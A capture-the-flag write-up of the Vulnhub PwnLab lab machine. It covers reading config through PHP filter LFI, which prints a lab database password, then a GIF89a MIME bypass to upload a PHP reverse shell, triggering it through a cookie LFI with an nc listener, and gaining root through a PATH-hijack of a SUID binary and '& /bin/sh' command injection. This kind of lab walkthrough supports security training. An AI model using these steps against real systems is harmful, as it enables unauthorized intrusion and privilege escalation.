# Vulnhub - PwnLab

This penetration test report details the steps and findings from the assessment of a target machine with the IP address `192.168.1.43`. The goal of the test was to identify vulnerabilities, gain unauthorized access, and escalate privileges. Below are the key actions taken during the penetration test.

## Initial Network Enumeration

### Discovering Local Machines

```bash
sudo netdiscover -r 192.168.1.0/24
```

- A network scan was performed to discover all machines on the local network (`192.168.1.0/24`).
- The target machine was identified at IP `192.168.1.43`.

## Initial Scanning

### Nmap Scan

```bash
nmap -sC -sV 192.168.1.43
```

- The scan identified services running on ports 80 (HTTP), 111 (RPC), and 3306 (MySQL).
- Vulnerabilities related to MySQL version 5.5.47-0 were detected.

## Web Application Enumeration

- A web application was identified on port 80, which was running Apache 2.4.10 on Debian.
- The `dirb` tool was used to enumerate the web application.

dirb detected an interesting URL: http://192.168.1.43/upload/ 

## Local File Inclusion (LFI) / Remote File Inclusion (RFI)

- LFI and RFI vulnerabilities were explored using wrappers. (https://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/)
- A base64-encoded string was discovered using LFI, containing database connection information.

  `http://192.168.1.43/?page=php://filter/read=convert.base64-encode/resource=config`

 ![image](https://github.com/fullopsec/Pentests/assets/114147068/061288b5-3762-4b90-aec2-e30bfee7e189)

![image](https://github.com/fullopsec/Pentests/assets/114147068/ee900b05-8925-4732-a842-0e1e4a09e8d4)


The end result :

`php $server = "localhost"; $username = "root"; $password = "H4u%QJ\_H99"; $database = "Users"; ?`

## MySQL Database Access

- MySQL database credentials were obtained from the LFI vulnerability.
- The following users and hashed encode in base64 were identified:
  - kent: JWzXuBJJNy
  - mike: SIfdsTEn6I
  - kane: iSv5Ym2GRo
 
![image](https://github.com/fullopsec/Pentests/assets/114147068/0bdd0c10-0668-4eb4-9982-698cbaddfa5e)
    
![image](https://github.com/fullopsec/Pentests/assets/114147068/49b3a42a-a64d-4a0c-b687-4bc85c702f45)

![image](https://github.com/fullopsec/Pentests/assets/114147068/4e07348d-5903-4eec-822c-356769fcd5fe)


## File Upload and Bypass

- We can now connect to the website to upload

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/0be1bcc1-253e-411a-9b45-fb2cdc0d4927)

- The application blocked file uploads that did not match specified conditions. We tried to upload a reverse shell in PHP 

No file aperead

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/b6cabdf8-891d-484d-9475-66c6d79c7010)

- We re-exploited the LFI vulnerability to get the code of the upload page to bypass the blocking mecanism

`curl http://192.168.1.43/\?page\=php://filter/read\=convert.base64-encode/resource\=upload`  

![image](https://github.com/fullopsec/Pentests/assets/114147068/d82a2b2c-02d3-48a7-a519-f591ef21ca25)

We just have to decode in base64 :

```

<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
    <body>
        <form action='' method='post' enctype='multipart/form-data'>
            <input type='file' name='file' id='file' />
            <input type='submit' name='submit' value='Upload'/>
        </form>
    </body>
</html>
<?php 
if(isset($_POST['submit'])) {
    if ($_FILES['file']['error'] <= 0) {
        $filename  = $_FILES['file']['name'];
        $filetype  = $_FILES['file']['type'];
        $uploaddir = 'upload/';
        $file_ext  = strrchr($filename, '.');
        $imageinfo = getimagesize($_FILES['file']['tmp_name']);
        $whitelist = array(".jpg",".jpeg",".gif",".png"); 

        if (!(in_array($file_ext, $whitelist))) {
            die('Not allowed extension, please upload images only.');
        }

        if(strpos($filetype,'image') === false) {
            die('Error 001');
        }

        if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
            die('Error 002');
        }

        if(substr_count($filetype, '/')>1){
            die('Error 003');
        }

        $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
            echo "<img src=\"".$uploadfile."\"><br />";
        } else {
            die('Error 4');
        }
    }
}

?>
```
We Know that we must search for a mime check file bypass exploit.

- Using google we found one quite fast : https://www.exploit-db.com/exploits/7509

- We discover that to bypass the file check we just have to add these strings at the begining of the php reverse shell :
 
```
GIF89aP;
[shell]
```

![image](https://github.com/fullopsec/Pentests/assets/114147068/d69b7206-3292-4b71-b0d3-8bd8f696758f)

- The upload now Work !

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/bdb4de5c-3160-4946-8efb-ca5955004de0)

But it does,'t seem to execute it as we get an error.

![image](https://github.com/fullopsec/Pentests/assets/114147068/6cc2ac00-e0fa-4683-a789-ce8b2193d32b)


## Exploiting File Upload via Cookie

- To bypass the file not executing, the `lang` cookie was manipulated to inject a GIF header into the uploaded file. (https://medium.com/@tehmezovismayil/cookie-based-php-local-file-inclusion-bug-bounty-553f8b38d4dc)

- Network > click on / index request and go on header then resend and edit
  
  ![image](https://github.com/fullopsec/Pentests/assets/114147068/42f54723-f49b-48f4-aa45-ecfde0f01c27)

- Listen on teh attacker console :
  
  `nc -lvp 4242`

- Change the cookie to the GIF name of the revese shell in uploads  :

`lang=../upload/29e8ea4a462331c5af3754eb8dbd4328.gif`

- Resend the request :

 ![image](https://github.com/fullopsec/Pentests/assets/114147068/03fe84c1-e354-48a4-b89b-14f8ef530079)

We got our reverse shell !

## Web Shell and Privilege Escalation

- A web shell was obtained through the upload vulnerability.
  
- The shell was further upgraded to an interactive one.
  
  `python -c 'import pty; pty.spawn("/bin/bash")'`

- The kernel version `3.16.0-4-686-pae` was identified on the target machine.

- We try users that we hacked from the database earlier

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/1186dec3-be45-4c65-816d-18be5ec56578)

We are now connected as user kent.

## Privilege Escalation with SUID Binary

- A setuid binary called `msgmike` was discovered in the home directory of the user `kent`.

msgmike is a binary but its owned by mike which we cant access normally (https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/)

- Reading content of binary : 

`strings msgmike`

results in :

```
setregid  
setreuid  
cat /home/mike/msg.txt
```

So it use cat and use a dangerous setuid

- Create a new cat "binary"

`echo "/bin/bash" > /tmp/cat`
`chmod 777 /tmp/cat`

- Change path to the new cat file

```
export PATH=/tmp:$PATH  
echo $PATH
```

![image](https://github.com/fullopsec/Pentests/assets/114147068/00443511-4c0e-4e6b-9eeb-667f93ec6bfa)

- Privilege escalate as Mike

![image](https://github.com/fullopsec/Pentests/assets/114147068/f0d3b265-0d47-433d-a334-2dd1977cc9b0)

TL-DR : We changed our path and created a new cat fake binary that contain instruction to give us a shell. since msgmike execute as mike when we executed the program, it executed ou new cat binary and gave us a mike shell.

## Privilege Escalation to Root

- mike has a similar bianary (msg2root)

`strings msg2root`

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/42491f96-b3b5-445d-996a-4a743b94abdc)

`/bin/echo %s >> /root/messages` Can be exploited

- Use a basic separator in the echo field
  
  (& /bin/sh) as a parameter in the program will execute the /bin/sh command as root since it has a setuid bit.

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/ec1436a7-a835-4aa7-9258-fabac7396327)



# Conclusion

Through a comprehensive web application assessment, critical vulnerabilities such as LFI were exploited to gain unauthorized access, leading to a compromise of the MySQL database. Leveraging a MIME check file bypass, we successfully uploaded a PHP script, establishing a persistent connection through a cookie-based exploit. By exploiting a setuid binary, we escalated privileges and eventually gained root access via an echo command injection. 
